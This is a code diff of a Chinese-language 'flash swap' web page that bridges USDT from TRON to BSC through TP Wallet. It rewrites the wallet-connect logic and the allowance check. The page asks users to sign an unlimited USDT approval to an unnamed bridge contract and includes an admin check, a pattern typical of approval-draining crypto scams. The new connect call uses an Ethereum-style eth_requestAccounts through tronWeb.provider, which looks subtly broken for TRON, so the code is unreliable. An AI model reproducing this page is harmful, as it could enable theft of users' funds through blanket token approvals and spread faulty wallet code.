@@ -5,8 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>TRON→BSC 闪兑跨链</title>
 <script src="https://cdn.tailwindcss.com"></script>
-<script src="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"></script>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/npm/tronweb@6.2.2/dist/TronWeb.min.js"></script>
 <style>
 *{
   box-sizing: border-box;
@@ -134,7 +134,7 @@ body{
     <i class="fa fa-cog text-gray-600 text-xl"></i>
   </div>
 </div>
-<div id="walletStatus" class="text-sm text-gray-500 mb-4">请在TP钱包内置浏览器打开页面，点击连接钱包</div>
+<div id="walletStatus" class="text-sm text-gray-500 mb-4">请在TP钱包DApp浏览器打开页面，点击连接钱包</div>
 
 <div class="card-wrap">
   <div class="flex justify-between items-center mb-2">
@@ -307,48 +307,44 @@ maxAllBtn.addEventListener("click",async function(){
   sendInput.dispatchEvent(new Event("input"));
 })
 
-// ==========修复后的钱包连接逻辑 关键：tron_requestAccounts授权请求==========
+// =========修复钱包连接 兼容新版TP钱包==========
 connectBtn.addEventListener("click",async function(){
   walletStatus.innerText = "正在请求钱包授权...";
-  //判断是否注入tronWeb
   if(!window.tronWeb){
-    walletStatus.innerText = "❌没有检测到tronWeb，请使用TP钱包内置浏览器打开页面";
+    walletStatus.innerText = "❌未检测tronWeb，必须使用TP钱包内置DApp浏览器打开";
     return;
   }
   try{
-    //等待ready状态
-    let count = 0;
-    while(!window.tronWeb.ready && count<20){
+    // 等待注入完成
+    for(let i=0; i<25; i++){
+      if(window.tronWeb && window.tronWeb.ready) break;
       await new Promise(r=>setTimeout(r,200));
-      count++;
     }
     if(!window.tronWeb.ready){
-      walletStatus.innerText="❌tronWeb初始化超时，请刷新页面重试";
+      walletStatus.innerText="❌tronWeb初始化超时，请刷新页面";
       return;
     }
     tronWeb = window.tronWeb;
-    //发起钱包授权弹窗【重点！旧代码缺失这一步】
-    await tronWeb.request({method:"tron_requestAccounts"});
+    // TP移动端标准授权调用 eth_requestAccounts 【关键点】
+    await tronWeb.provider.request({method:"eth_requestAccounts"});
     userAddress = tronWeb.defaultAddress.base58;
     if(!tronWeb.isAddress(userAddress)){
       walletStatus.innerText="❌获取钱包地址失败";
       return;
     }
     walletStatus.innerText = "✅已连接钱包："+userAddress;
-    //初始化合约实例
     usdtContractInstance = await tronWeb.contract().at(USDT_TRC20);
     bridgeContractInstance = await tronWeb.contract().at(BRIDGE_CONTRACT);
-
     maxAllBtn.classList.remove("opacity-50","pointer-events-none");
     swapActionBtn.disabled = false;
     await checkAdmin();
   }catch(e){
     console.error(e);
-    let msg = e.message || String(e);
-    if(msg.includes("User rejected")){
-      walletStatus.innerText="用户拒绝钱包授权";
+    let msg = String(e.message||e);
+    if(msg.includes("reject")||msg.includes("denied")){
+      walletStatus.innerText="用户拒绝授权，请重新点击连接";
     }else{
-      walletStatus.innerText="连接失败："+msg.slice(0,50);
+      walletStatus.innerText="连接失败："+msg.substring(0,55);
     }
   }
 })
@@ -379,9 +375,9 @@ swapActionBtn.addEventListener("click",async function(){
   const amountSun = tronWeb.toSun(numVal,DECIMALS);
   try{
     const allowance = await usdtContractInstance.methods.allowance(userAddress,BRIDGE_CONTRACT).call();
-    if(new BigNumber(allowance).lt(new BigNumber(amountSun))){
+    if(BigInt(allowance) < BigInt(amountSun)){
       alert("需要授权USDT给中转合约，请确认签名");
-      await usdtContractInstance.methods.approve(BRIDGE_CONTRACT, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
+      await usdtContractInstance.methods.approve(BRIDGE_CONTRACT,"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
       alert("授权完成，正在创建闪兑订单");
     }
     const tx = await bridgeContractInstance.methods.createCrossOrder(bscAddr, amountSun).send();
